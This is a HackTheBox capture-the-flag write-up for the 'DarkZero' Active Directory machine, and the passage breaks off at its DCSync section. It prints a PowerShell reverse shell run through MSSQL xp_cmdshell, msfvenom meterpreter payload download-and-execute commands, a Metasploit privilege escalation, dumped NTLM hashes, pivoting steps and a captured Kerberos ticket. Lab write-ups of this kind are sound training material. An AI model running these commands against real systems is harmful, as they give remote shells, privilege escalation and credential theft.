---
title: HTB DarkZero
published: 2025-10-10
description: Darkzero is a Windows Active Directory hard machine of season 9, we will learn MSSQL | 2025 CVE | Persistence | Cross-Forest Abuse | Pivoting | Unconstrained Delegation abuse | DCSync...
image: 'https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/78acdd0d87ed629f6cd2dc378bdcddac.png'
tags: [Active Directory, Hard, HackTheBox,]
category: Writeup
draft: false
---

# DarkZero

## Recon

We start off  with the given creds: `john.w` `RFulUtONCOL!`

As always we start off by performing an `nmap` `TCP` scan&#x20;

```bash
nmap --privileged -p- --open -Pn -n --min-rate 5000 -sS -sCV -vvv -oN scan 10.129.166.117
```

```python
# Nmap 7.95 scan initiated Sun Oct  5 14:42:48 2025 as: /usr/lib/nmap/nmap --privileged --privileged -p- --open -Pn -n --min-rate 5000 -sS -sCV -vvv -oN scan 10.129.166.117
Nmap scan report for 10.129.166.117
Host is up, received user-set (0.044s latency).
Scanned at 2025-10-05 14:42:48 WEST for 129s
Not shown: 65512 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-10-05 20:43:20Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: darkzero.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.darkzero.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.darkzero.htb
| Issuer: commonName=darkzero-DC01-CA/domainComponent=darkzero
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-07-29T11:40:00
| Not valid after:  2026-07-29T11:40:00
| MD5:   ce57:1ac8:da76:eb62:efe8:4e85:045b:d440
| SHA-1: 603a:f638:aabb:7eaa:1bdb:4256:5869:4de2:98b6:570c
| -----BEGIN CERTIFICATE-----
| MIIHNzCCBR+gAwIBAgITUgAAAAO4Lw91dEi9jwAAAAAAAzANBgkqhkiG9w0BAQsF
...
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: darkzero.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC01.darkzero.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.darkzero.htb
| Issuer: commonName=darkzero-DC01-CA/domainComponent=darkzero
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-07-29T11:40:00
| Not valid after:  2026-07-29T11:40:00
| MD5:   ce57:1ac8:da76:eb62:efe8:4e85:045b:d440
| SHA-1: 603a:f638:aabb:7eaa:1bdb:4256:5869:4de2:98b6:570c
| -----BEGIN CERTIFICATE-----
| MIIHNzCCBR+gAwIBAgITUgAAAAO4Lw91dEi9jwAAAAAAAzANBgkqhkiG9w0BAQsF
...
|_-----END CERTIFICATE-----
1433/tcp  open  ms-sql-s      syn-ack ttl 127 Microsoft SQL Server 2022 16.00.1000.00; RTM
|_ssl-date: 2025-10-05T20:44:56+00:00; +6h59m59s from scanner time.
| ms-sql-ntlm-info: 
|   10.129.166.117:1433: 
|     Target_Name: darkzero
|     NetBIOS_Domain_Name: darkzero
|     NetBIOS_Computer_Name: DC01
|     DNS_Domain_Name: darkzero.htb
|     DNS_Computer_Name: DC01.darkzero.htb
|     DNS_Tree_Name: darkzero.htb
|_    Product_Version: 10.0.26100
| ms-sql-info: 
|   10.129.166.117:1433: 
|     Version: 
|       name: Microsoft SQL Server 2022 RTM
|       number: 16.00.1000.00
|       Product: Microsoft SQL Server 2022
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Issuer: commonName=SSL_Self_Signed_Fallback
| Public Key type: rsa
| Public Key bits: 3072
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-10-05T18:35:05
| Not valid after:  2055-10-05T18:35:05
| MD5:   9d2d:fa5f:a88c:291d:902c:26e1:e24c:f180
| SHA-1: dc17:0498:e35c:38e5:c0c0:25db:34f6:4d0b:f103:159b
| -----BEGIN CERTIFICATE-----
| MIIEADCCAmigAwIBAgIQQo4BrPBlZLdJX5+7CRaomzANBgkqhkiG9w0BAQsFADA7
| ...
|_-----END CERTIFICATE-----
2179/tcp  open  vmrdp?        syn-ack ttl 127
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: darkzero.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC01.darkzero.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.darkzero.htb
| Issuer: commonName=darkzero-DC01-CA/domainComponent=darkzero
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-07-29T11:40:00
| Not valid after:  2026-07-29T11:40:00
| MD5:   ce57:1ac8:da76:eb62:efe8:4e85:045b:d440
| SHA-1: 603a:f638:aabb:7eaa:1bdb:4256:5869:4de2:98b6:570c
| -----BEGIN CERTIFICATE-----
| MIIHNzCCBR+gAwIBAgITUgAAAAO4Lw91dEi9jwAAAAAAAzANBgkqhkiG9w0BAQsF
...
|_-----END CERTIFICATE-----
3269/tcp  open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: darkzero.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC01.darkzero.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.darkzero.htb
| Issuer: commonName=darkzero-DC01-CA/domainComponent=darkzero
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-07-29T11:40:00
| Not valid after:  2026-07-29T11:40:00
| MD5:   ce57:1ac8:da76:eb62:efe8:4e85:045b:d440
| SHA-1: 603a:f638:aabb:7eaa:1bdb:4256:5869:4de2:98b6:570c
| -----BEGIN CERTIFICATE-----
| MIIHNzCCBR+gAwIBAgITUgAAAAO4Lw91dEi9jwAAAAAAAzANBgkqhkiG9w0BAQsF
...
|_-----END CERTIFICATE-----
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
49664/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49670/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49671/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49891/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49921/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
51107/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
61513/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 54148/tcp): CLEAN (Timeout)
|   Check 2 (port 34546/tcp): CLEAN (Timeout)
|   Check 3 (port 46116/udp): CLEAN (Timeout)
|   Check 4 (port 54896/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-time: 
|   date: 2025-10-05T20:44:18
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: mean: 6h59m58s, deviation: 0s, median: 6h59m58s

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Oct  5 14:44:57 2025 -- 1 IP address (1 host up) scanned in 128.81 seconds
```

As we can see we're probably facing a `DC` (Domain Controller) because all of the simultaneously open ports: `TCP Port 88 (Kerberos)` | `TCP Port 135 (RPC)` | `TCP Port 5985 (WinRM)`...

We can also enumerate the `Domain Name` which is `DC01.darkzero.htb` so we'll add it to our `/etc/hosts` using `netexec`

```bash
netexec smb 10.129.166.117 -u 'john.w' -p 'RFulUtONCOL!' --generate-hosts-file /etc/hosts
```

We also see that the `TCP Port 1433 (MSSQL)` is open which can be dangerous if misconfigured but we'll enumerate that later on.

We already know that methodology is the most important on `Red Teaming` so let's enumerate everything, starting off by `TCP Port 53 (DNS)` and check if any record contains useful information using `dig`:

```bash
dig @10.129.166.117 DC01.darkzero.htb

; <<>> DiG 9.20.9-1-Debian <<>> @10.129.166.117 DC01.darkzero.htb
; (1 server found)
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 36122
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 2, AUTHORITY: 0, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4000
;; QUESTION SECTION:
;DC01.darkzero.htb.		IN	A

;; ANSWER SECTION:
DC01.darkzero.htb.	3600	IN	A	10.129.166.117
DC01.darkzero.htb.	3600	IN	A	172.16.20.1

;; Query time: 40 msec
;; SERVER: 10.129.166.117#53(10.129.166.117) (UDP)
;; WHEN: Sun Oct 05 14:40:58 WEST 2025
;; MSG SIZE  rcvd: 78
```

`DC01.darkzero.htb` resolves to another IP: `172.16.20.1` that is not reachable from our network, this means we will probably need to `pivot` &#x20;

Well enumerate now `TCP Port 445 | (SMB)` using `netexec`&#x20;

```bash
❯ netexec smb 10.129.166.117 -u 'john.w' -p 'RFulUtONCOL!' --users
SMB         10.129.166.117  445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:darkzero.htb) (signing:True) (SMBv1:False) 
SMB         10.129.166.117  445    DC01             [+] darkzero.htb\john.w:RFulUtONCOL! 
SMB         10.129.166.117  445    DC01             -Username-                    -Last PW Set-       -BadPW- -Description-                                               
SMB         10.129.166.117  445    DC01             Administrator                 2025-09-10 16:42:44 0       Built-in account for administering the computer/domain 
SMB         10.129.166.117  445    DC01             Guest                         <never>             0       Built-in account for guest access to the computer/domain 
SMB         10.129.166.117  445    DC01             krbtgt                        2025-07-29 11:40:16 0       Key Distribution Center Service Account 
SMB         10.129.166.117  445    DC01             john.w                        2025-07-29 15:33:53 0        
SMB         10.129.166.117  445    DC01             [*] Enumerated 4 local users: darkzero
❯ netexec smb 10.129.166.117 -u 'john.w' -p 'RFulUtONCOL!' --shares
SMB         10.129.166.117  445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:darkzero.htb) (signing:True) (SMBv1:False) 
SMB         10.129.166.117  445    DC01             [+] darkzero.htb\john.w:RFulUtONCOL! 
SMB         10.129.166.117  445    DC01             [*] Enumerated shares
SMB         10.129.166.117  445    DC01             Share           Permissions     Remark
SMB         10.129.166.117  445    DC01             -----           -----------     ------
SMB         10.129.166.117  445    DC01             ADMIN$                          Remote Admin
SMB         10.129.166.117  445    DC01             C$                              Default share
SMB         10.129.166.117  445    DC01             IPC$            READ            Remote IPC
SMB         10.129.166.117  445    DC01             NETLOGON        READ            Logon server share 
SMB         10.129.166.117  445    DC01             SYSVOL          READ            Logon server share 
```

And we see that  `john.w`,  `Guest` and `Administrator` are the only available users, so we'll skip `RPC Enumeration`&#x20;

## Enumerating MSSQL

Let's use the `impacket-mssqlclient` tool for this step

```bash
impacket-mssqlclient 'john.w:RFulUtONCOL!'@10.129.166.117 -windows-auth
```

After some enumeration we find this

```bash
SQL (darkzero\john.w  guest@master)> enum_links
SRV_NAME            SRV_PROVIDERNAME   SRV_PRODUCT   SRV_DATASOURCE      SRV_PROVIDERSTRING   SRV_LOCATION   SRV_CAT   
-----------------   ----------------   -----------   -----------------   ------------------   ------------   -------   
DC01                SQLNCLI            SQL Server    DC01                NULL                 NULL           NULL      

DC02.darkzero.ext   SQLNCLI            SQL Server    DC02.darkzero.ext   NULL                 NULL           NULL      

Linked Server       Local Login       Is Self Mapping   Remote Login   
-----------------   ---------------   ---------------   ------------   
DC02.darkzero.ext   darkzero\john.w                 0   dc01_sql_svc   

SQL (darkzero\john.w  guest@master)> 
```

Which means there are 2 `DCs`, `DC01` and `DC02.darkzero.ext`, let's try and use the link to `DC02`

```bash
SQL (darkzero\john.w  guest@master)> use_link "DC02.darkzero.ext"
SQL >"DC02.darkzero.ext" (dc01_sql_svc  dbo@master)> 
```

And then check if we can use `xp_cmdhsell`&#x20;

```bash
SQL >"DC02.darkzero.ext" (dc01_sql_svc  dbo@master)> enable_xp_cmdshell
INFO(DC02): Line 196: Configuration option 'show advanced options' changed from 1 to 1. Run the RECONFIGURE statement to install.
INFO(DC02): Line 196: Configuration option 'xp_cmdshell' changed from 1 to 1. Run the RECONFIGURE statement to install.
SQL >"DC02.darkzero.ext" (dc01_sql_svc  dbo@master)> xp_cmdshell whoami
output                 
--------------------   
darkzero-ext\svc_sql   

NULL                   

SQL >"DC02.darkzero.ext" (dc01_sql_svc  dbo@master)> 
```

And we got `RCE`!!!

## Foothold

Let's try and set up our reverse shell using the `xp_cmdshell` on `DC02.darkzero.ext` with a `powershell` one-liner

```bash
EXEC xp_cmdshell 'powershell -c "$client = New-Object System.Net.Sockets.TCPClient(''10.10.14.10'',1920);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + ''PS '' + (pwd).Path + ''> '';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"'
```

<figure><img src="https://3550432212-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FgxTXO9Ixrx4ExK6jnMbc%2Fuploads%2FwrQ5ul4nW66AGH31LWUD%2Fimage.png?alt=media&#x26;token=08637f4b-39c9-4b42-bcf8-2aa25e554e15" alt=""><figcaption></figcaption></figure>

## Privilege Escalation on DC02 using msf CVE

Since we're already in, let's check the subnet that we saw earlier:

```powershell
PS C:\Windows\system32> ipconfig /all

Windows IP Configuration

   Host Name . . . . . . . . . . . . : DC02
   Primary Dns Suffix  . . . . . . . : darkzero.ext
   Node Type . . . . . . . . . . . . : Hybrid
   IP Routing Enabled. . . . . . . . : No
   WINS Proxy Enabled. . . . . . . . : No
   DNS Suffix Search List. . . . . . : darkzero.ext

Ethernet adapter Ethernet:

   Connection-specific DNS Suffix  . : 
   Description . . . . . . . . . . . : Microsoft Hyper-V Network Adapter
   Physical Address. . . . . . . . . : 00-15-5D-F2-5C-01
   DHCP Enabled. . . . . . . . . . . : No
   Autoconfiguration Enabled . . . . : Yes
   IPv4 Address. . . . . . . . . . . : 172.16.20.2(Preferred) 
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 172.16.20.1
   DNS Servers . . . . . . . . . . . : 127.0.0.1
   NetBIOS over Tcpip. . . . . . . . : Enabled
PS C:\Windows\system32> 
```

This confirms that we are inside of a `subnet` (`172.16.20.0/24`), for more comfort let's use `msfvenom` along with `msfconsole's` `multi/handler`&#x20;

First, generate the `payload`

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.10 LPORT=4444 -f exe -o rev.exe
```

Set `multi/handler` listener

```bash
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST tun0
LHOST => 10.10.14.10
msf6 exploit(multi/handler) > run
[*] Started reverse TCP handler on 10.10.14.10:4444 
```

Set `python` server on port 80

```python
python3 -m http.server 80
```

Download and run the `payload` on `DC02`&#x20;

```bash
# On DC02
Invoke-WebRequest -Uri "http://10.10.14.10/rev.exe" -OutFile "C:\Temp\rev.exe"; Start-Process "C:\Temp\rev.exe"
.\rev.exe

# On metasploit
[*] Sending stage (203846 bytes) to 10.129.166.117
[*] Meterpreter session 3 opened (10.10.14.10:4444 -> 10.129.166.117:55081) at 2025-10-05 15:34:34 +0100
```

And we get our upgraded `meterpreter` shell, for a quick `privesc` check let's try the `exploit suggester` module

```python
use multi/recon/local_exploit_suggester
set SESSION 3
run
```

After we run it and try  some of the exploits, one successfully works giving us `NT\ AUTHORITY SYSTEM` on `DC02`&#x20;

```powershell
msf6 exploit(windows/local/cve_2024_30088_authz_basep) > run
[*] Started reverse TCP handler on 10.10.14.10:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable. Version detected: Windows Server 2022. Revision number detected: 2113
[*] Reflectively injecting the DLL into 408...
[+] The exploit was successful, reading SYSTEM token from memory...
[+] Successfully stole winlogon handle: 1108
[+] Successfully retrieved winlogon pid: 596
[*] Sending stage (203846 bytes) to 10.129.166.117
[*] Meterpreter session 5 opened (10.10.14.10:4444 -> 10.129.166.117:55109) at 2025-10-05 15:39:22 +0100

meterpreter > shell
Process 1108 created.
Channel 1 created.
Microsoft Windows [Version 10.0.20348.2113]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>type C:\Users\Administrator\Desktop\user.txt
type C:\Users\Administrator\Desktop\user.txt
b9ef0097375178ceff1738021c7520b2

C:\Windows\system32>
```

Hence giving us the first part of the machine and obtaining the `user.txt` &#x20;

## Persistence on DC02

After this, we establish `persistence` on DC02 using the `hashdump` command on `meterpreter` so we can `PtH` (Pass-The-Hash) later on:

```powerquery
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:6963aad8ba1150192f3ca6341355eb49:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:43e27ea2be22babce4fbcff3bc409a9d:::
svc_sql:1103:aad3b435b51404eeaad3b435b51404ee:816ccb849956b531db139346751db65f:::
DC02$:1000:aad3b435b51404eeaad3b435b51404ee:663a13eb19800202721db4225eadc38e:::
darkzero$:1105:aad3b435b51404eeaad3b435b51404ee:4276fdf209008f4988fa8c33d65a2f94:::
meterpreter > 
```

## Cross-Forest Abuse with Bloodhound

Now that we got our persistence settled up, let's enumerate weak permissions and privileges that we can abuse across forests

```powershell
PS C:\Windows\system32> Get-ADTrust -Filter *


Direction               : BiDirectional
DisallowTransivity      : False
DistinguishedName       : CN=darkzero.htb,CN=System,DC=darkzero,DC=ext
ForestTransitive        : True
IntraForest             : False
IsTreeParent            : False
IsTreeRoot              : False
Name                    : darkzero.htb
ObjectClass             : trustedDomain
ObjectGUID              : 700b5e64-8ae9-4528-a968-26e2b4a44509
SelectiveAuthentication : False
SIDFilteringForestAware : False
SIDFilteringQuarantined : False
Source                  : DC=darkzero,DC=ext
Target                  : darkzero.htb
TGTDelegation           : False
TrustAttributes         : 8
TrustedPolicy           : 
TrustingPolicy          : 
TrustType               : Uplevel
UplevelOnly             : False
UsesAESKeys             : False
UsesRC4Encryption       : False
```

This means we got a `BiDirectional` `Domain` trust between `Domains` ,&#x20;

1. The bidirectional trust allows `cross-domain authentication`
2. We can potentially compromise targets in `darkzero.htb`
3. Any `unconstrained delegation` systems in either domain become accessible
4. `Kerberos` trust tickets can be abused for lateral movement

```bash
PS C:\Windows\system32> Get-ADComputer -Server "darkzero.htb" -Filter {TrustedForDelegation -eq $true} -Properties TrustedForDelegation


DistinguishedName    : CN=DC01,OU=Domain Controllers,DC=darkzero,DC=htb
DNSHostName          : DC01.darkzero.htb
Enabled              : True
Name                 : DC01
ObjectClass          : computer
ObjectGUID           : fcaaece7-ea3a-483f-b52c-4ddae3e3251a
SamAccountName       : DC01$
SID                  : S-1-5-21-1152179935-589108180-1989892463-1000
TrustedForDelegation : True
UserPrincipalName    : 
```

We found that `unconstrained delegation` is enabled!!  this is a massive security misconfiguration so we're going to `exploit` it after establishing our `port forwarding`&#x20;

We are going to set our `pivoting server` and `agents` with `ligolo`&#x20;

## Port Forwarding from DC02 to DC01

After pinging the `DC01` from `DC02` we see the following

```powerquery
C:\Windows\system32>ping DC01.darkzero.htb
ping DC01.darkzero.htb

Pinging DC01.darkzero.htb [172.16.20.1] with 32 bytes of data:
Reply from 172.16.20.1: bytes=32 time<1ms TTL=128
Reply from 172.16.20.1: bytes=32 time<1ms TTL=128
Reply from 172.16.20.1: bytes=32 time<1ms TTL=128
```

So the IP Address assigned from this `subnet` to DC01 is `172.16.20.1`&#x20;

For this, we'll use the `ligolo-mp` tool on our `kali` attacker machine to set up our listener server

```bash
sudo apt install ligolo-mp
sudo ligolo-mp server
```

And then press enter on `admin` to connect, Then `CTRL+N` To create an `agent` with the following parameters

<figure><img src="https://3550432212-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FgxTXO9Ixrx4ExK6jnMbc%2Fuploads%2F319fFTcnnwFjDi4wUjVB%2Fimage.png?alt=media&#x26;token=7777139f-9ed0-4267-88ee-c18b583eb9db" alt=""><figcaption></figcaption></figure>

Then we change the `bin` file to an `exe` file so we can run it from `DC02`

```bash
ls
agent.bin
mv agent.bin agent.exe
```

Now we can upload it to the `DC02` so we can pivot to the `internal network`&#x20;

```bash
meterpreter > upload /home/delorian/ligolo/agents/agent.exe
[*] Uploading  : /home/delorian/ligolo/agents/agent.exe -> agent.exe
[*] Uploaded 5.03 MiB of 5.03 MiB (100.0%): /home/delorian/ligolo/agents/agent.exe -> agent.exe
[*] Completed  : /home/delorian/ligolo/agents/agent.exe -> agent.exe
meterpreter > shell
Process 448 created.
Channel 6 created.
Microsoft Windows [Version 10.0.20348.2113]
(c) Microsoft Corporation. All rights reserved.

C:\Temp>.\agent.exe
.\agent.exe
```

<figure><img src="https://3550432212-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FgxTXO9Ixrx4ExK6jnMbc%2Fuploads%2FYMhriVUyCPMfK8Zxsij8%2Fimage.png?alt=media&#x26;token=8ff76138-169e-448e-bd77-bcf59862d937" alt=""><figcaption></figcaption></figure>

We successfully got our connection to our `ligolo` server as `DC02`&#x20;

We add our route with `Enter - Add Route` and type the `subnet` there

<figure><img src="https://3550432212-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FgxTXO9Ixrx4ExK6jnMbc%2Fuploads%2F7ZkebAoapKQI37eaQmfm%2Fimage.png?alt=media&#x26;token=beed1f38-f926-4802-a0d3-9b5cf7e0cccd" alt=""><figcaption></figcaption></figure>

## Unconstrained Delegation abuse

First off we need to set `Rubeus.exe` on monitor mode on `DC02` to capture the TGT from `DC01`&#x20;

```bash
sudo apt install rubeus
rubeus

> rubeus ~ Raw Kerberos interaction and abuses

/usr/share/windows-resources/rubeus
└── Rubeus.exe
```

Set up our listener on the attacker machine

```python
python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

We upload it to `DC02`&#x20;

```bash
Invoke-WebRequest -Uri "http://10.10.14.10/Rubeus.exe" -OutFile "C:\Temp\Rubeus.exe"; Start-Process "C:\Temp\Rubeus.exe"
.\Rubeus.exe monitor /nowrap /interval:3
```

Now we trigger authentication with `coercer` from `DC01` to `DC02` attempting to receive the `TGT` on `DC02`&#x20;

```bash
coercer coerce -u john.w -p 'RFulUtONCOL!' -t 172.16.20.1 --dc-ip 10.129.227.87 -l dc02.darkzero.ext --always-continue
```

And we successfully receive the `TGT` on `Rubeus`

```powerquery
C:\Temp> Rubeus.exe monitor /interval:5 /filteruser:DC01$ /autorenew /nowrap

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v1.6.4 

[*] Action: TGT Monitoring
[*] Target user     : DC01$
[*] Monitoring every 5 seconds for new TGTs


[*] 10/5/2025 11:30:57 PM UTC - Found new TGT:

  User                  :  DC01$@DARKZERO.HTB
  StartTime             :  10/5/2025 11:33:28 AM
  EndTime               :  10/5/2025 9:33:27 PM
  RenewTill             :  10/12/2025 11:33:27 AM
  Flags                 :  name_canonicalize, pre_authent, renewable, forwarded, forwardable
  Base64EncodedTicket   :

    doIFjDCCBYigAwIBBaEDAgEWooIElDCCBJBhggSMMIIEiKADAgEFoQ4bDERBUktaRVJPLkhUQqIhMB+gAwIBAqEYMBYbBmtyYnRndBsMREFSS1pFUk8uSFRCo4IETDCCBEigAwIBEqEDAgECooIEOgSCBDZ0+zfxhnqa3XKwRDQ+TSPdxnbON8YkeHynWhI0qzcinmwtkTEwskVWI7CQ4NFJu4qW9o4UuFt8ICQ+1hon9oRG8g5AjlP1cdo6XbnMYJor5SuSOkOdGEmh4ZRd7QBnHSnUXMqi+Ym+fgBnhUI3FnXV9brJ14U87y9zU0TsCDB0pmFvawR8No5rdbNjeN4xFWvU8MEZGmqzi9GOejMrXMEtC87CWa0Gccrlw0lsdgMD638xlO0NV1oVNmVAVPrSJnI751bWnDNqIKvfuLNTpFue5+RJ5n/bRgHqEvL9Ec7nUt0rkmLZjrhwB1NQLl8H5wonruQfgrUqQwyDfYSerqf0IFApLcXyLYi4mhzodAgog+9EL+xNXPhbTFxR2jJSWejP7fxrTfd9uwMT6e5oWkmCegJuuHwMv01QXxjzJU+DtAuK0CNAk2l9c5q0bf7Mr4gkgYqSet39+KryByAUBXZ5LVEHliwx/aQ1KFUqtFpoI9rDrH92JWoxJmTVvtgFxDnVIYwNVMzOtj2l1tKvOfEf4fkqZSUfWiXYuD9Td/6jFjxfJpM6vbHT8lT6lWnyuvSvoo4FkGvBi1N23G2aIDP70JCSrZdJKxa5v0xznVBH4ZS1DJ/RympzFYWOOCjpZXMuNgSKbivuvXxAkS2jt12brgVBgDIgq1qBijEV7vRK+q7zYa70xP6pPZfuKoe6n6b1mLqPMDDKTMXE07tu+h+FeB4dD6MawWFYFGSw6jNhsp/zYs9kSHNuvUhsZvl4lftvVndnOuHY5u2oNwmCLqBnyxXI6YT2UKD+FdffRzuHHT5KFfUwg4iwMgDa3U5+s1xZV0jUX2ycBQvdqFNFRqW8nJSpH6Of8MMk3VYfG3+EFtcRQ8iT6dyMakiHq9NFesqBOJ4JWf813KsME2Tt8g4xX4w/qHnejra8YLHNVXPOc9+N84IIGmWDa05ECs5YRyrQv3gGQi+DVINzf2xDvREiwLy74quNqLWOXSzXEScdjKWp17rI/c+NPba1LOA9MA3F2uPS4VtKBZCG7zuNqQr8IgYjPzSY/hw9YgzqPJJBtqLrwlA0USkV1zDfgiJD4ZheKvqJ9NT88MRqKBiGODWfZa6MyGaJqGT+VqFg8ML9+4+Wc4l8NSp3NQjLGIAeN63oesoiPARLscWZJHI8XGdbS8Ztt/sQshUo3IVEa7Sx4VoVyzsM4iUynB5oQvAT+Hu+wFNhXRmTJLGiewnpCyDT3H3az7/RunlMfjgNNpNzDqaz2jlMvXQcji3ECQ2NrvJxOZbcN9GEv8gjaBnqo/h+cprL2GJ4a6OVDLmUlGgJC8fJ8jfCf36ZLtsQZJOkez7QxNOOCzj3sx34bmd5bfOgQtvBRx1p1QaOKP3dbbxZWDgtOxiXa+sBZCnwYmVg489m9bW/uGEGgIQ6mne6mCAU8f9RFZNYo4HjMIHgoAMCAQCigdgEgdV9gdIwgc+ggcwwgckwgcagKzApoAMCARKhIgQgdEY4RtFyMPGLrTuDMV0/xV3e1sNTMfDpfC31A/8EHoChDhsMREFSS1pFUk8uSFRCohIwEKADAgEBoQkwBxsFREMwMSSjBwMFAGChAAClERgPMjAyNTEwMDUxODMzMjhaphEYDzIwMjUxMDA2MDQzMzI3WqcRGA8yMDI1MTAxMjE4MzMyN1qoDhsMREFSS1pFUk8uSFRCqSEwH6ADAgECoRgwFhsGa3JidGd0GwxEQVJLWkVSTy5IVEI=

[*] Ticket cache size: 1
```

## DCSync Attack

Now lets import the ticket with `Rubeus`&#x20;

```bash
